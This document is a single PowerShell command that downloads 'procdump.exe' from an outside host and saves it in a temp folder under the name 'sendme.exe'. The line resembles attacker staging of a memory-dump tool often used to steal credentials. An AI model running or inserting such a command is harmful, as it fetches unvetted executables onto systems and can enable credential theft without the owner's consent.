
Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe

